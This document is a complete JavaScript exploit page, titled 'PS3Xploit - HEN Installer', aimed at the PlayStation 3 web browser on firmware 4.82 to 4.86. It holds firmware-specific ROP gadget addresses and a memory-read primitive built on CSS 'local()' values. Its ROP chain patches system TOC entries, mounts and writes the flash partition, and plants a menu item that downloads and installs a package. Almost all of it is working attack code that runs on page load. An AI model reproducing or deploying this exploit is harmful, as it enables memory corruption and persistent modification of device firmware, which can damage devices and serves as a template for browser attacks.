<script>
var ua=navigator.userAgent,
	fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple"));
if(fwv==="4.82"){
	var toc_addr=0x6F5550,
	default_vsh_pub_toc=0x6ED5A4,
	vsh_opd_patch=0x96D5C,
	vsh_opd_addr=0x6EBB68,
	vsh_toc_addr_screenshot=0x72057C,
	vsh_ps3hen_key_toc=0x707774,
	toc_entry1_addr=0x6DA3D0,
	toc_entry2_addr=0x725A38,
	toc_entry3_addr=0x6DA3C8,
	toc_entry4_addr=0x740000,
	toc_entry5_addr=0x6EB6C0,
	gadget1_addr=0x097604,
	gadget2_addr=0x60A044,
	gadget3_addr=0x0D505C,
	gadget4_addr=0x229838,
	gadget5_addr=0x12BB1C,
	gadget6_addr=0x615C3C,
	gadget7_addr=0x01FFD0,
	gadget8_addr=0x020000,
	gadget9_addr=0x029B08,
	gadget10_addr=0x62DF84,
	gadget11_addr=0x59A4B0,
	gadget12_addr=0x0C864C,
	gadget13_addr=0x48E5A8,
	gadget14_addr=0x48C7A0,
	gadget15_addr=0x489C88,
	gadget_mod1_addr=0x60EF38,
	gadget_mod2_addr=0x013B74,
	gadget_mod3_addr=0x0B8E00,
	gadget_mod4a_addr=0x0D9684,
	gadget_mod4b_addr=0x42C778,
	gadget_mod4c_addr=0x054AF0,
	gadget_mod5_addr=0x4238DC,
	gadget_mod6_addr=0x020C00,
	gadget_mod7_addr=0x01A6AC,
	gadget_mod8_addr=0x2BACB8,
	gadget_mod9_addr=0x010B20,
	gadget_mod10_addr=0x1C5794,
	gadget_mod11_addr=0x18B144,
	gadget_mod12_addr=0x63315C,
	gadget_mod13_addr=0x336870,
	gadget_mod14_addr=0x633860,
	gadget_mod15_addr=0x39D038,
	gadget_mod16_addr=0x4F732C;}
if(fwv==="4.84"){
	var toc_addr=0x6F5558,
	default_vsh_pub_toc=0x6ED5AC,
	vsh_opd_patch=0x96D5C,
	vsh_opd_addr=0x6EBB70,
	vsh_toc_addr_screenshot=0x72067C,
	vsh_ps3hen_key_toc=0x70786C,
	toc_entry1_addr=0x6DA3D0,
	toc_entry2_addr=0x725B38,
	toc_entry3_addr=0x6DA3C8,
	toc_entry4_addr=0x740000,
	toc_entry5_addr=0x6EB6C8,
	gadget1_addr=0x097604,
	gadget2_addr=0x60A0E4,
	gadget3_addr=0x0D505C,
	gadget4_addr=0x229838,
	gadget5_addr=0x12BB1C,
	gadget6_addr=0x615CDC,
	gadget7_addr=0x01FFD0,
	gadget8_addr=0x020000,
	gadget9_addr=0x029B08,
	gadget10_addr=0x62E024,
	gadget11_addr=0x59A4B0,
	gadget12_addr=0x0C864C,
	gadget13_addr=0x48E5A8,
	gadget14_addr=0x48C7A0,
	gadget15_addr=0x489C88,
	gadget_mod1_addr=0x60EFD8,
	gadget_mod2_addr=0x013B74,
	gadget_mod3_addr=0x0B8E00,
	gadget_mod4a_addr=0x0D9684,
	gadget_mod4b_addr=0x42C778,
	gadget_mod4c_addr=0x054AF0,
	gadget_mod5_addr=0x4238DC,
	gadget_mod6_addr=0x020C00,
	gadget_mod7_addr=0x01A6AC,
	gadget_mod8_addr=0x2BACB8,
	gadget_mod9_addr=0x010B20,
	gadget_mod10_addr=0x1C5794,
	gadget_mod11_addr=0x18B144,
	gadget_mod12_addr=0x6331FC,
	gadget_mod13_addr=0x336870,
	gadget_mod14_addr=0x633900,
	gadget_mod15_addr=0x39D038,
	gadget_mod16_addr=0x4F732C;}
if(fwv==="4.85"){
	var toc_addr=0x6F5558,
	default_vsh_pub_toc=0x6ED5AC,
	vsh_opd_patch=0x96D5C,
	vsh_opd_addr=0x6EBB70,
	vsh_toc_addr_screenshot=0x72067C,
	vsh_ps3hen_key_toc=0x70786C,
	toc_entry1_addr=0x6DA3D0,
	toc_entry2_addr=0x725B38,
	toc_entry3_addr=0x6DA3C8,
	toc_entry4_addr=0x740000,
	toc_entry5_addr=0x6EB6C8,
	gadget1_addr=0x097604,
	gadget2_addr=0x60A0E4,
	gadget3_addr=0x0D505C,
	gadget4_addr=0x229838,
	gadget5_addr=0x12BB1C,
	gadget6_addr=0x615CDC,
	gadget7_addr=0x01FFD0,
	gadget8_addr=0x020000,
	gadget9_addr=0x029B08,
	gadget10_addr=0x62E024,
	gadget11_addr=0x59A4B0,
	gadget12_addr=0x0C864C,
	gadget13_addr=0x48E5A8,
	gadget14_addr=0x48C7A0,
	gadget15_addr=0x489C88,
	gadget_mod1_addr=0x60EFD8,
	gadget_mod2_addr=0x013B74,
	gadget_mod3_addr=0x0B8E00,
	gadget_mod4a_addr=0x0D9684,
	gadget_mod4b_addr=0x42C778,
	gadget_mod4c_addr=0x054AF0,
	gadget_mod5_addr=0x4238DC,
	gadget_mod6_addr=0x020C00,
	gadget_mod7_addr=0x01A6AC,
	gadget_mod8_addr=0x2BACB8,
	gadget_mod9_addr=0x010B20,
	gadget_mod10_addr=0x1C5794,
	gadget_mod11_addr=0x18B144,
	gadget_mod12_addr=0x6331FC,
	gadget_mod13_addr=0x336870,
	gadget_mod14_addr=0x633900,
	gadget_mod15_addr=0x39D038,
	gadget_mod16_addr=0x4F732C;}
if(fwv==="4.86"){
	var toc_addr=0x6F5558,
	default_vsh_pub_toc=0x6ED5AC,
	vsh_opd_patch=0x96D5C,
	vsh_opd_addr=0x6EBB70,
	vsh_toc_addr_screenshot=0x72082C,
	vsh_ps3hen_key_toc=0x707A1C,
	toc_entry1_addr=0x6DA3D0,
	toc_entry2_addr=0x725CE8,
	toc_entry3_addr=0x6DA3C8,
	toc_entry4_addr=0x740000,
	toc_entry5_addr=0x6EB6C8,
	gadget1_addr=0x097604,
	gadget2_addr=0x60A0E4,
	gadget3_addr=0x0D505C,
	gadget4_addr=0x229838,
	gadget5_addr=0x12BB1C,
	gadget6_addr=0x615CDC,
	gadget7_addr=0x01FFD0,
	gadget8_addr=0x020000,
	gadget9_addr=0x029B08,
	gadget10_addr=0x62E024,
	gadget11_addr=0x59A4B0,
	gadget12_addr=0x0C864C,
	gadget13_addr=0x48E5A8,
	gadget14_addr=0x48C7A0,
	gadget15_addr=0x489C88,
	gadget_mod1_addr=0x60EFD8,
	gadget_mod2_addr=0x013B74,
	gadget_mod3_addr=0x0B8E00,
	gadget_mod4a_addr=0x0D9684,
	gadget_mod4b_addr=0x42C778,
	gadget_mod4c_addr=0x054AF0,
	gadget_mod5_addr=0x4238DC,
	gadget_mod6_addr=0x020C00,
	gadget_mod7_addr=0x01A6AC,
	gadget_mod8_addr=0x2BACB8,
	gadget_mod9_addr=0x010B20,
	gadget_mod10_addr=0x1C5794,
	gadget_mod11_addr=0x18B144,
	gadget_mod12_addr=0x6331FC,
	gadget_mod13_addr=0x336870,
	gadget_mod14_addr=0x633900,
	gadget_mod15_addr=0x39D038,
	gadget_mod16_addr=0x4F732C;}
var xtra_data,
	stack_frame,
	jump_2,
	jump_1,
	xtra_data_addr,
	stack_frame_addr,
	jump_2_addr,
	jump_1_addr,
	offset_array = [],
	t_out = 0,
	search_max_threshold,
	search_base,
	search_size,
	search_base_off,
	search_size_ext,
	gtemp_addr = 2365587456,
	total_loops = 0,
	max_loops = 20,
	frame_fails = 0,
	sp_exit = 0x8FD8DCC0,
	ffs = 4294967295,
	dbyte41 = 16705,
	dbyte00 = 0,
	byte_size = 1,
	hword_size = 2,
	word_size = 4,
	dword_size = 8,
	mbytes = 1048576,
	stat_size_offset = 40,
	index_key = "DA7D4B5E499A4F53B1C1A14A7484443B",
	ps3xploit_ecdsa_key = "948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",
	flash_partition='xxxxCELL_FS_IOS:BUILTIN_FLSH1',
	filesystem='CELL_FS_FAT',
	mount_path='/dev_rewrite',
	fail_msg_frag="<h1><span style='color:red'>Exploit initialization failed!</h1></span>",
	progress_msg_frag1="<h1>Initializing... ",
	progress_msg_frag2='%</h1>',
	write_file = "/dev_rewrite/vsh/resource/explore/xmb/category_network.xml",
	baseURL = window.location.href.replace(/[^/]*$/, ''),
	write_file_contents='<?xml version="1.0" encoding="UTF-8"?><XMBML version="1.0"><View id="root"><Attributes><Table key="hen"><Pair key="focus_priority"><String>-1</String></Pair></Table></Attributes><Items><Query class="type:x-xmb/folder-pixmap" key="hen" attr="hen" src="#hen_link"/><Query class="type:x-xmb/folder-pixmap" key="seg_premo" src="sel://localhost/nopremo?category_network.xml#seg_premo"/><Query class="type:x-xmb/folder-pixmap" key="seg_browser" src="#seg_browser"/></Items></View><View id="seg_premo"><Items><Item class="type:x-xmb/xmlpremo" key="PRemo" /></Items></View><View id="seg_browser"><Attributes><Table key="browser"><Pair key="icon_rsc"><String>tex_browser</String></Pair><Pair key="icon_notation"><String>WNT_XmbItemBrowser</String></Pair><Pair key="title_rsc"><String>msg_browser</String></Pair></Table></Attributes><Items><Item class="type:x-xmb/xmlwebbrowser" key="browser" attr="browser" /></Items></View><View id="hen_link"><Attributes><Table key="ps3hen_main"><Pair key="icon_rsc"><String>item_tex_Players</String></Pair><Pair key="title"><String>Install HEN</String></Pair><Pair key="info"><String>Downloads and installs the latest HEN Package (Reboot after)</String></Pair></Table></Attributes><Items><Query class="type:x-xmb/folder-pixmap" key="ps3hen_main" attr="ps3hen_main" src="#ps3hen_pkg" /></Items></View><View id="ps3hen_pkg"><Attributes><Table key="ps3hen_link"><Pair key="info"><String>net_package_install</String></Pair><Pair key="pkg_src"><String>'+baseURL+fwv+'/HEN.pkg</String></Pair><Pair key="pkg_src_qa" ><String>'+baseURL+fwv+'/HEN.pkg</String></Pair><Pair key="content_name"><String>msg_install</String></Pair><Pair key="content_id"><String>CUSTOM-INSTALLER_00-0000000000000000</String></Pair><Pair key="prod_pict_path"><String>'+baseURL+'hendl.png</String></Pair></Table></Attributes><Items><Item class="type:x-xmb/xmlnpsignup" key="ps3hen_link" attr="ps3hen_link" /></Items></View></XMBML>';
document.write('<html><title>PS3Xploit - HEN Installer</title><div id="result"></div><div id="exploit"></div><div id="trigger"></div></html>');
function memcpy(dest,src,len)
{
	return callsub(gadget8_addr,dest,src,len,0,0,0,0,0,0,0x70);
}
function callsub(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out)
{
	var min_stack_size=0x20; 
	if(r31out===null){r31out=gtemp_addr;}
	if(r31in===null){r31in=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(r11)+hexw2bin(r10)
	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31in)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(sub)+fill_by_16bytes(sub_frame_size-min_stack_size,dbyte00)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function encTxt(text)
{
	return String.fromCharCode.apply(null,text.split('').map(function(e){return e.charCodeAt(0).toString(16)}).join('').toUpperCase().match(/[A-F0-9]{4}/g).map(function(v){return parseInt(v,16)}))
}
function showResult(str)
{
	document.getElementById('result').innerHTML=str;
}
function syscall_r3_p2p(sc,r3_ptr,r4,r5,r6,r7,r8,r9,r10,r31out)
{
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)
	+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3_ptr)
	+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function save_file_overwrite(to,fd,buf,wlen,size,nl)
{
	return syscall(0x321,to,0x241,fd,0x1B6,nl,0,0,0)
		+syscall_r3_p2p(0x323,fd,buf,size,wlen,0,0,0,0,0,0)
		+syscall_r3_p2p(0x324,fd,0,0,0,0,0,0,0,0,0);
}
function hexh2bin(hex_val)
{
	return String.fromCharCode(hex_val);

}
function hexw2bin(hex_val)
{
	return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val);
}
function hexdw2bin(hex_val)
{
	return hexw2bin(0) + hexw2bin(hex_val);
}
String.prototype.toHex16 = function()
{
	return ('0000' + this).substr(-4);
};
String.prototype.toAscii = function(hex_16)
{
    var ascii='';
	var i=0;
	while(i<this.length){if(hex_16===true){ascii += this.charCodeAt(i).toString(16).toHex16();} else {ascii += this.charCodeAt(i).toString(16);}i+=1;}
	return ascii;
};
String.prototype.convert=function(ascii)
{
	if(this.length<1){return '';}
	var asciistr='';var asciichr='';var i=0;var ret=[];
	if(ascii===true){asciistr = this;}
	else {asciistr = this.toAscii();}
	while((asciistr.length%4)!==0){asciistr+='00';}
	if(asciistr.substr(asciistr.length-3,2)!=='00'){asciistr+='0000';}
    while(i<asciistr.length){
		asciichr = asciistr.substr(i, 4);
		ret.push(String.fromCharCode(parseInt(asciichr, 16)));
		i+=4;
    }
    return ret.join('');
};
String.prototype.convertedSize = function(ascii)
{
	if(this.length<1){return 0;}
	var asciistr='';
	if(ascii===true){asciistr=this;}
	else {asciistr = this.toAscii();}
	while((asciistr.length%4)!==0){asciistr+='00';}
	if(asciistr.substr(asciistr.length-3,2)!=='00'){asciistr+='0000';}
	return asciistr.length/2;
};
String.prototype.replaceAt=function(index, ch)
{
	return this.substr(0,index)+ch+this.substr(index+ch.length);
};
String.prototype.repeat = function(num)
{
    return new Array(num+1).join(this);
};
Number.prototype.noExponents=function()
{
    var data= String(this).split(/[eE]/);
    if(data.length===1) {return data[0];}
    var  z= '', sign= this<0? '-':'',
    str= data[0].replace('.', ''),
    mag= Number(data[1])+ 1;
    if(mag<0){
        z= sign+'0.';
        while(mag++){z+='0';}
        return z+str.replace(/^\-/,'');
    }
    mag -= str.length;  
    while(mag--) {z += '0';}
    return str + z;
};
function fromIEEE754(bytes, ebits, fbits)
{
	var retNumber=0;
	var bits=[];
	var i;
	var j;
	var byte;
	for (i=bytes.length;i;i-=1)
	{
		byte=bytes[i-1];
		for(j=8;j;j-=1)
		{
			bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
		}
	}
	bits.reverse();
	var str = bits.join('');
	var bias = (1 << (ebits - 1)) - 1;
	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
	var e = parseInt(str.substring(1, 1 + ebits), 2);
	var f = parseInt(str.substring(1 + ebits), 2);
	if (e === (1 << ebits) - 1)
	{
		retNumber = f !== 0 ? NaN : s * Infinity;
	}
	else if (e > 0)
	{
		retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
	}
	else if (f !== 0)
	{
		retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
	}
	else
	{
		retNumber = s * 0;
	}
	return retNumber.noExponents();
}
function generateIEEE754(address, size)
{
	var hex = new Array
	(
		(address >> 24) & 0xFF,
		(address >> 16) & 0xFF,
		(address >> 8) & 0xFF,
		(address) & 0xFF,
		
		(size >> 24) & 0xFF,
		(size >> 16) & 0xFF,
		(size >> 8) & 0xFF,
		(size) & 0xFF
	);
	return fromIEEE754(hex, 11, 52);
}
function generateExploit(address, size)
{
	var n = (address<<32) | ((size>>1)-1);
	return generateIEEE754(address, (n-address));
}
function readMemory(address, size)
{
	if(document.getElementById('exploit')){document.getElementById('exploit').style.src = "local(" + generateExploit(address, size) + ")";}
}
function checkMemory(address, size, len)
{
	if(document.getElementById('exploit'))
	{
		readMemory(address, size);
		return document.getElementById('exploit').style.src.substr(6,len);
	}
}
function trigger(exploit_addr){
	if(document.getElementById('trigger')){document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");}
	if (document.getElementById('trigger').innerHTML.indexOf("NaN") != -1) {
		document.write("<html><h1><span style='color:red'>You must install Hybrid Firmware (HFW) before installing HEN!</h1></span></html>");
		return;
	}
}
function load_check()
{
	if(total_loops<max_loops)
	{
		showResult(progress_msg_frag1+((100/max_loops)*total_loops).toString()+progress_msg_frag2);
		t_out=setTimeout(initROP,150,false);
	}
	else
	{
		total_loops=0;
		showResult(fail_msg_frag);
		t_out=0;
	}
}
function findJsVariableOffset(name,exploit_data,base,size)
{
	readMemory(base,size);
	var dat=document.getElementById('exploit').style.src.substr(6,size);
	var i=0;
	var t;
	var k;
	var match;
	var exploit_addr;
	while(i<(dat.length*2))
	{
		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
		{
			match=0;
			for (k=0;k<(exploit_data.length*2);k+=0x2)
			{
				if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2)){break;}
				match+=1;
			}
			if (match===exploit_data.length)
			{
				exploit_addr=base+i+4;
				
				for(t=0;t<offset_array.length;t+=1)
				{
					if(offset_array[t]===exploit_addr)
					{
						return -1;
					}
				}
				offset_array.push(exploit_addr);
				return exploit_addr;
			}
		}
		i+=0x10;
	}
	var end_range=base+size;
	return 0;
}
function stack_frame_hookup()
{
	return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41);
}
function stack_frame_exit()
{
	return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A");
}
function syscall(sc,r3,r4,r5,r6,r7,r8,r9,r10,r31out)
{
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(sc)+hexw2bin(r10)
	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function fill_by_4bytes(nbytes,hex_val)
{
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/4){stemp+=tmp.repeat(2);iterator++;}
	return stemp;
}
function fill_by_8bytes(nbytes,hex_val)
{
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/8){stemp+=tmp.repeat(4);iterator++;}
	return stemp;
}
function fill_by_16bytes(nbytes,hex_val)
{
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/16){stemp+=tmp.repeat(8);iterator++;}
	return stemp;
}
function store_word(store_offset,val,r29out,r30out,r31out)
{
	r29out=gtemp_addr;
	r30out=gtemp_addr;
	r31out=gtemp_addr;
	return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(store_offset-0xC74)+fill_by_16bytes(0x10,dbyte41)
	+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function initROP(init)
{
	try
	{

		if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0;}
		if(t_out!==0){clearTimeout(t_out);t_out=0;}
		offset_array=[];
		xtra_data_addr=0;
		stack_frame_addr=0;
		jump_2_addr=0;
		jump_1_addr=0;
		search_max_threshold=70*0x100000;
		search_base=0x80200000;
		search_size=2*mbytes;
		search_base_off=0*mbytes;
		search_size_ext=0*mbytes;
		total_loops++;
		store_idx_arr1=[];
		store_idx_arr2=[];

		xtra_data=flash_partition.convert()
		+index_key.convert(true)
		+ps3xploit_ecdsa_key.convert(true)
		+filesystem.convert()
		+mount_path.convert()
		+write_file.convert()
		+fill_by_4bytes(0xC,dbyte00)
		+encTxt(write_file_contents)
		+fill_by_4bytes(0xC,dbyte00)
		+fill_by_16bytes(0x90,dbyte00)
		+unescape("\uFD7E");

		while(xtra_data_addr===0)
		{
			if(search_max_threshold<search_size){load_check();return;}
			xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));
			xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);
			search_max_threshold-=search_size;
		}

		flash_partition_addr=xtra_data_addr;
		index_key_addr=flash_partition_addr+flash_partition.convertedSize()-0x4;
		ps3xploit_ecdsa_key_addr=index_key_addr+index_key.convertedSize(true);
		fs_addr=ps3xploit_ecdsa_key_addr+ps3xploit_ecdsa_key.convertedSize(true);
		mount_path_addr=fs_addr+filesystem.convertedSize();

		write_file_addr=mount_path_addr+mount_path.convertedSize();
		write_filefd_addr=write_file_addr+write_file.convertedSize();
		write_file_readlen_addr=write_filefd_addr+word_size;
		write_file_contents_addr=write_file_readlen_addr+dword_size;

		null_addr=write_file_contents_addr+dword_size;

		stack_frame=stack_frame_hookup()
		+store_word(toc_entry1_addr, vsh_opd_patch+4)
		+store_word(toc_entry3_addr, vsh_opd_patch+4)
		+store_word(toc_entry5_addr, vsh_opd_patch+4)
		+store_word(default_vsh_pub_toc, vsh_ps3hen_key_toc)
		+memcpy(vsh_ps3hen_key_toc-0x20, index_key_addr, (index_key.length/2))
		+memcpy(vsh_ps3hen_key_toc,ps3xploit_ecdsa_key_addr,(ps3xploit_ecdsa_key.length/2))
		+syscall(0x345,flash_partition_addr,fs_addr,mount_path_addr,0,0,0,0,0)
		+save_file_overwrite(write_file_addr,write_filefd_addr,write_file_contents_addr,write_file_readlen_addr,write_file_contents.length,null_addr)
		+stack_frame_exit();

		while(stack_frame_addr===0)
		{
			if(search_max_threshold<search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0;}load_check();return;}
			stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));
			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);
			if(stack_frame_addr==-1)if(search_max_threshold<search_size+search_size_ext){frame_fails++;load_check();return;}
			search_max_threshold-=search_size+search_size_ext;
		}
		jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");		
		while(jump_2_addr===0)
		{
			if(search_max_threshold<search_size){load_check();return;}
			jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));
			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);
			if(jump_2_addr==-1)if(search_max_threshold<search_size){load_check();return;}
			search_max_threshold-=search_size;
		}
		jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");
		while(jump_1_addr===0)
		{
			if(search_max_threshold<search_size){load_check();return;}
			jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));
			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);
			if(jump_1_addr==-1)if(search_max_threshold<search_size){load_check();return;}
			search_max_threshold-=search_size;
		}
		var sf=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);
		var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);
		var j2=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);
		var j1=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);
		if((j2===jump_2)&&(j1===jump_1)&&(x===xtra_data)&&(sf===stack_frame))
		{
			if(t_out!==0){clearTimeout(t_out);}
			showResult('<h1>Preparing...');
			triggerX();
		}
		else
		{
			load_check();
		}
	}
	catch(e)
	{
		
	}
}
function triggerX()
{
	setTimeout(trigger,100,jump_1_addr);
	setTimeout(showResult,2000,"<h1>How to install HEN</h1><h2>1. Close browser<br>2. Open Remote Play and quit immediately<br>3. Use new icon to download and install HEN</span><br>4. Reboot after installation</h2>");
	t_out=0;
	total_loops=0;
}
initROP(true);
</script>